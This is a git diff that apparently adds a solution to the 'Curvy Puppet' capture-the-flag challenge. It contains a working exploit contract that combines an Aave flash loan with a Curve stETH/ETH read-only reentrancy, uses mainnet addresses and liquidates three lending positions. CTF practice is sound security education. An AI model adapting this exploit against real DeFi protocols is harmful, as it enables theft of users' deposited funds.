@@ -159,6 +159,15 @@ contract CurvyPuppetChallenge is Test {
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
         
+        IERC20 lpToken = IERC20(curvePool.lp_token());
+        ExploitCurvyPupet exploitCurvyPupet = new ExploitCurvyPupet(lending, alice, bob, charlie);        
+        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE - 1);
+        lpToken.transferFrom(treasury, address(exploitCurvyPupet), TREASURY_LP_BALANCE - 1);
+        weth.withdraw(weth.balanceOf(player));
+        exploitCurvyPupet.attack{value: TREASURY_WETH_BALANCE - 1}();             
+
+        dvt.transfer(treasury, dvt.balanceOf(player));
+
     }
 
     /**
@@ -184,3 +193,101 @@ contract CurvyPuppetChallenge is Test {
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
     }
 }
+
+interface WSTETH is IERC20{
+    function unwrap(uint256 _wstETHAmount) external returns (uint256);
+    function wrap(uint256 _stETHAmount) external returns (uint256);
+}
+
+import {FlashLoanSimpleReceiverBase} from "aave-v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
+import {IPoolAddressesProvider} from "aave-v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
+
+contract ExploitCurvyPupet is FlashLoanSimpleReceiverBase {
+    address payable owner;
+    CurvyPuppetLending immutable lending;
+    IERC20 immutable borrowAsset;
+
+    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
+    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
+    WSTETH constant wstETH= WSTETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    address[3]  users ;
+
+    constructor(CurvyPuppetLending _lendingPool, address alice, address bob, address charlie)  
+        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e)){      
+            lending = _lendingPool;
+            borrowAsset = IERC20(lending.borrowAsset());
+            users[0] =  alice;
+            users[1] =  bob;
+            users[2] =  charlie;
+       
+    }
+
+    function attack() payable public {                
+        POOL.flashLoanSimple(
+            address(this),
+            address(wstETH),
+            200000e18,
+            "",
+            0
+        );
+    
+        IERC20  dvt = IERC20(lending.collateralAsset());
+        dvt.transfer(msg.sender,  dvt.balanceOf(address(this)));
+
+    }
+
+    function  executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address initiator,
+        bytes calldata params
+    )  external override returns (bool) {        
+        // Before Remove Liquidity
+            uint256 attackETH =  weth.balanceOf(address(this));
+            weth.withdraw(attackETH);
+            
+            wstETH.unwrap(180000e18);
+            uint256 attackStETH =  stETH.balanceOf(address(this));
+            stETH.approve(address(curvePool), attackStETH);
+        
+            uint[2] memory amounts = [attackETH, attackStETH];    
+            uint lp = curvePool.add_liquidity{value: attackETH}(amounts, 1);
+
+            uint[2] memory min_amounts = [uint(0), uint(0)];
+            curvePool.remove_liquidity(borrowAsset.balanceOf(address(this)) - 3e18, min_amounts);
+
+        // Receive Ether and read only reentrancy....
+
+        // After Remove Liquidity
+            curvePool.exchange{value: address(this).balance - attackETH}(0, 1,  address(this).balance - attackETH , 0 );
+            uint256 totalAmount = amount + premium;
+     
+            stETH.approve(address(wstETH),stETH.balanceOf(address(this))) ;
+            wstETH.wrap(stETH.balanceOf(address(this)));
+            IERC20(asset).approve(address(POOL), totalAmount);
+
+        return true;
+    }
+
+    receive() external payable {
+        if(msg.sender == address(curvePool)){            
+            IERC20(lending.borrowAsset()).approve(address(permit2), type(uint256).max);
+            permit2.approve({
+            token: lending.borrowAsset(),
+            spender: address(lending),
+            amount: uint160(type(uint256).max),
+            expiration: uint48(block.timestamp) + 1 days
+
+            });
+            
+            for (uint i = 0; i < users.length; i++) {
+                lending.liquidate(users[i]);                
+            }   
+        }
+    }
+
+}
+
